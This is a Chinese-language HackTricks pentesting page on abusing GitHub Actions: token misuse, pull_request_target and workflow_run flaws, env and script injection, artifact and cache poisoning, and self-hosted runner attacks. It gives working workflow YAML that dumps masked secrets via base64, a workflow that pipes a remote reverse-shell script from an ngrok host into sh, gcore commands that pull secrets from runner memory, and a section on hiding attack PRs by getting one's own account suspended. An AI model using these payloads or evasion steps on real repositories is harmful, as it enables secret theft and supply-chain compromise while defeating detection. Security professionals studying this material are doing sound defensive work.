# 滥用 Github Actions

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 PDF 版的 HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>

## 基本信息

在本页面中，您将找到：

* 攻击者成功访问 Github Action 的**所有影响的摘要**
* 获取访问操作的**不同方法**：
* 拥有创建操作的**权限**
* 滥用与**拉取请求**相关的触发器
* 滥用**其他外部访问**技术
* 从已被入侵的仓库**转移**（Pivoting）
* 最后，关于**利用操作内部的后渗透技术**的部分（引起上述影响）

## 影响摘要

有关[**Github Actions 的介绍，请查看基本信息**](../basic-github-information.md#github-actions)。

如果您可以在**存储库**中**执行任意 Github 操作/注入代码**，您可能能够：

* **窃取**该存储库/组织的**密钥**。
* 如果您只能注入代码，则可以窃取工作流程中已存在的任何内容。
* 滥用**存储库权限**以访问其他平台，如 AWS 和 GCP。
* 在使用自定义工作器时**在自定义工作器中执行代码**，并尝试从那里进行转移。
* **覆盖**存储库**代码**。
* 这取决于`GITHUB_TOKEN`的权限（如果有）。
* **危害** **部署**和其他**构件**。
* 如果代码正在部署或存储某些内容，您可以修改它并获得进一步的访问权限。

## GITHUB\_TOKEN

这个“**密钥**”（来自`${{ secrets.GITHUB_TOKEN }}`和`${{ github.token }}`）是当管理员启用此选项时提供的：

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

这个令牌与**Github 应用程序使用的令牌相同**，因此它可以访问相同的端点：[https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github 应该发布一个[**流程**](https://github.com/github/roadmap/issues/74)，允许在 GitHub 内部进行**跨存储库**访问，以便存储库可以使用`GITHUB_TOKEN`访问其他内部存储库。
{% endhint %}

您可以在此链接中查看此令牌的可能**权限**：[https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

请注意，该令牌**在作业完成后过期**。\
这些令牌看起来像这样：`ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

您可以使用此令牌执行一些有趣的操作：

{% tabs %}
{% tab title="合并 PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="批准 PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="创建PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
请注意，在多种情况下，您可以在 Github Actions envs 或 secrets 中找到 github 用户令牌。这些令牌可能会赋予您对存储库和组织的更多权限。
{% endhint %}

<details>

<summary>在 Github Action 输出中列出 secrets</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>使用secrets获取反向shell</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

可以通过检查操作日志来查看给予Github Token的权限，以了解其在其他用户存储库中的权限：

<figure><img src="../../../.gitbook/assets/image (97).png" alt="" width="269"><figcaption></figcaption></figure>

## 允许执行

{% hint style="info" %}
这将是入侵Github actions的最简单方法，因为这种情况假设您可以在组织中**创建新的存储库**，或者对存储库具有**写权限**。

如果您处于这种情况下，您只需查看[后渗透技术](./#post-exploitation-techniques-from-inside-an-action)。
{% endhint %}

### 从存储库创建执行

如果组织成员可以**创建新的存储库**并且您可以执行github actions，您可以**创建一个新的存储库并窃取组织级别设置的机密**。

### 从新分支执行

如果您可以在已经配置了Github Action的存储库中**创建一个新的分支**，您可以**修改**它，**上传**内容，然后从新分支**执行该操作**。这样，您可以**窃取存储库和组织级别的机密**（但您需要知道它们的名称）。

您可以在**手动**执行修改后的操作时，当**创建PR**时，或者当**推送代码**时执行（取决于您想要的噪音程度）：
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## 分叉执行

{% hint style="info" %}
有不同的触发器可以允许攻击者**执行另一个存储库的 Github Action**。如果这些可触发的操作配置不当，攻击者可能能够对其进行入侵。
{% endhint %}

### `pull_request`

工作流触发器**`pull_request`**将在每次收到拉取请求时执行工作流，但有一些例外情况：默认情况下，如果这是您**首次合作**，某个**维护者**将需要**批准**工作流的运行：

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
由于**默认限制**是针对**首次**贡献者，您可以通过贡献**修复有效的错误/拼写错误**，然后发送**其他 PR 来滥用您的新的 `pull_request` 权限**。

**我测试过这个，它不起作用**：~~另一种选择是创建一个使用曾经贡献过该项目并删除了账户的人的名字的账户。~~
{% endhint %}

此外，默认情况下，**阻止对目标存储库的写入权限**和**访问密钥**，如[**文档**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories)所述：

> 除了 `GITHUB_TOKEN` 外，当从**分叉**存储库触发工作流时，**不会将密钥传递给运行器**。**`GITHUB_TOKEN` 在来自分叉存储库的拉取请求中具有只读权限**。

攻击者可以修改 Github Action 的定义以执行任意操作并附加任意操作。然而，由于上述限制，他将无法窃取密钥或覆盖存储库。

{% hint style="danger" %}
**是的，如果攻击者在 PR 中更改将被触发的 Github Action，他的 Github Action 将被使用，而不是来自原始存储库的那个！**
{% endhint %}

由于攻击者还控制着要执行的代码，即使在 `GITHUB_TOKEN` 上没有密钥或写入权限，攻击者也可以例如**上传恶意构件**。

### **`pull_request_target`**

工作流触发器**`pull_request_target`**对目标存储库具有**写入权限**和**访问密钥**（无需权限）。

请注意，工作流触发器**`pull_request_target`**在**基本上下文**中运行，而不是在 PR 提供的上下文中（以**不执行不受信任的代码**）。有关 `pull_request_target` 的更多信息，请查看[**文档**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target)。\
此外，有关此特定危险用法的更多信息，请查看此[**github 博客文章**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)。

看起来因为**执行的工作流**是在**基本上**而不是在 PR 中定义的，所以使用**`pull_request_target`**是**安全**的，但有一些**情况下不是**。

而且，这个将**访问密钥**。

### `workflow_run`

[**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) 触发器允许在另一个工作流完成、请求或进行中时从一个工作流中运行工作流。

在此示例中，配置了一个工作流，在单独的 "Run Tests" 工作流完成后运行：
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
此外，根据文档：由`workflow_run`事件启动的工作流能够**访问密钥和写入令牌，即使之前的工作流没有**。

如果这种工作流依赖于可以通过**`pull_request`**或**`pull_request_target`**由外部用户**触发**的**工作流**，则可能会受到攻击。一些易受攻击的示例可以在[**此博客中找到**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**。**第一个示例是由**`workflow_run`**触发的工作流下载攻击者的代码：`${{ github.event.pull_request.head.sha }}`\
第二个示例是将来自不受信任的代码的**构件**传递给**`workflow_run`**工作流，并以使其**容易受到RCE攻击**的方式使用该构件的内容。

### `workflow_call`

待办事项

待办事项：检查当从pull\_request执行时，使用/下载的代码是来自原始代码还是来自分叉的PR

## 滥用分叉执行

我们已经提到了外部攻击者可以如何使github工作流执行，现在让我们看看如果配置不当，这些执行可以被滥用的方式：

### 不受信任的检出执行

在**`pull_request`**的情况下，工作流将在**PR的上下文中执行**（因此将执行**恶意PR的代码**），但是需要有人**首先授权**它，并且它将以一些[限制](./#pull\_request)运行。

如果一个使用**`pull_request_target`或`workflow_run`**的工作流依赖于可以从**`pull_request_target`或`pull_request`**触发的工作流，那么将执行原始存储库的代码，因此**攻击者无法控制执行的代码**。

{% hint style="danger" %}
但是，如果**操作**具有**显式的PR检出**，将从PR获取代码（而不是从基础代码获取），它将使用攻击者控制的代码。例如（请检查第12行下载PR代码的位置）：
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

潜在的**不受信任的代码在`npm install`或`npm build`期间运行**，因为构建脚本和引用的**软件包由PR的作者控制**。

{% hint style="warning" %}
用于搜索易受攻击操作的github dork是：`event.pull_request pull_request_target extension:yml`，但是，即使操作配置不安全，仍然有不同的方法可以安全地配置要执行的作业（例如使用关于生成PR的操作者的条件语句）。
{% endhint %}

### 上下文脚本注入 <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

请注意，有一些[**github上下文**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context)的值由创建PR的**用户**控制。如果github操作使用该数据来执行任何操作，可能会导致任意代码执行：

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV脚本注入** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

根据文档：您可以通过定义或更新环境变量并将其写入**`GITHUB_ENV`**环境文件，使环境变量在工作流作业的任何后续步骤中可用。

如果攻击者可以在此**env**变量中**注入任何值**，他可以注入可以在后续步骤中执行代码的环境变量，例如**LD\_PRELOAD**或**NODE\_OPTIONS**。

例如（[**此处**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0)和[**此处**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)），想象一个信任上传的构件以将其内容存储在**`GITHUB_ENV`**环境变量中的工作流。攻击者可以上传类似于以下内容的内容来进行攻击：

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### 易受攻击的第三方Github操作

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

如[**此博客文章**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks)中所述，此Github操作允许访问来自不同工作流和甚至存储库的构件。

问题在于，如果未设置**`path`**参数，则构件将被提取到当前目录中，并且可能会覆盖稍后在工作流中使用或甚至执行的文件。因此，如果构件存在漏洞，攻击者可以滥用此漏洞来危害信任构件的其他工作流。

易受攻击的工作流示例：
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
这个工作流可以被以下方式攻击：
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

##其他外部访问

###删除的命名空间仓库劫持

如果一个账户改变了它的名字，另一个用户可以在一段时间后注册一个同名的账户。如果一个仓库在改名之前只有**少于100个星标**，Github将允许新注册的同名用户创建一个与被删除的仓库同名的仓库。

{% hint style="danger" %}
因此，如果一个操作使用了一个不存在账户的仓库，攻击者仍然有可能创建该账户并危害该操作。
{% endhint %}

如果其他仓库使用了**该用户仓库的依赖**，攻击者将能够劫持它们。在这里你可以找到更详细的解释：[https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

##仓库转向

{% hint style="info" %}
在本节中，我们将讨论一些技术，这些技术允许我们在假设我们对第一个仓库有某种访问权限的情况下，从一个仓库转向另一个仓库（请查看前一节）。
{% endhint %}

###缓存投毒

在**同一分支的工作流运行之间**维护着一个缓存。这意味着如果攻击者**入侵**了一个**包**，然后将其存储在缓存中，并且被一个**权限更高的**工作流下载和执行，他将能够**入侵**该工作流。

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

###资源投毒

工作流可以使用来自其他工作流甚至仓库的**资源**，如果攻击者设法**入侵**上传资源的Github Action，然后被另一个工作流使用，他将能够**入侵其他工作流**：

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

##从操作中进行后期利用

###通过OIDC访问AWS和GCP

请查看以下页面：

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

###访问秘密 <a href="#accessing-secrets" id="accessing-secrets"></a>

如果你将内容注入到脚本中，了解如何访问秘密是很有意思的：

* 如果秘密或令牌设置为**环境变量**，可以通过使用**`printenv`**直接从环境中访问。

<details>

<summary>在Github Action输出中列出秘密</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>使用secrets获取反向shell</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* 如果密钥直接在表达式中使用，生成的shell脚本将存储在磁盘上并可访问。
* ```bash
cat /home/runner/work/_temp/*
```
* 对于JavaScript操作，密钥通过环境变量发送。
* ```bash
ps axe | grep node
```
* 对于自定义操作，风险取决于程序如何使用从参数中获取的密钥：

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### 滥用自托管运行器

查找在非GitHub基础设施中执行的Github Actions的方法是在Github Action配置yaml中搜索`runs-on: self-hosted`。

自托管运行器可能可以访问额外敏感信息，其他网络系统（网络中的易受攻击的端点？元数据服务？），即使它是隔离和销毁的，也可能同时运行多个操作，恶意操作可能窃取其他操作的密钥。

在自托管运行器中，还可以通过转储其内存来获取工作流程的所有步骤的密钥，该密钥将包含在**_Runner.Listener_**进程中：

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

查看[**此文章以获取更多信息**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/)。

### Github Docker镜像注册表

可以通过Github操作来**构建和存储Docker镜像**。\
下面是一个示例：

<details>

<summary>Github操作构建和推送Docker镜像</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

正如您在前面的代码中所看到的，Github注册表托管在**`ghcr.io`**上。

具有对存储库的读取权限的用户将能够使用个人访问令牌下载Docker镜像：
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
然后，用户可以在Docker镜像层中搜索**泄露的秘密信息**：

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Github Actions日志中的敏感信息

即使**Github**尝试在操作日志中**检测秘密值**并**避免显示**它们，**在操作执行过程中生成的其他敏感数据**将不会被隐藏。例如，使用秘密值签名的JWT将不会被隐藏，除非[特别配置](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret)。

## 消除痕迹

（来自[**这里**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)的技术）首先，任何提出的PR在Github和目标GitHub账户中都是明显可见的。在GitHub中，默认情况下，我们**无法从互联网上删除PR**，但有一个技巧。对于被Github**暂停**的Github账户，它们的**所有PR都会被自动删除**并从互联网上移除。因此，为了隐藏您的活动，您需要**暂停您的GitHub账户或标记您的账户**。这将从互联网上**隐藏您在GitHub上的所有活动**（基本上删除所有您的攻击性PR）。

在GitHub中，一个组织非常积极地向GitHub报告账户。您所需要做的就是在问题中分享“一些东西”，他们将确保在12小时内暂停您的账户 :p，然后您的攻击将在github上变得不可见。

{% hint style="warning" %}
组织发现自己成为目标的唯一方法是通过SIEM检查GitHub日志，因为从GitHub UI中，PR将被删除。
{% endhint %}

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的**公司广告**，或者如果您想访问**PEASS的最新版本或下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧**。

</details>
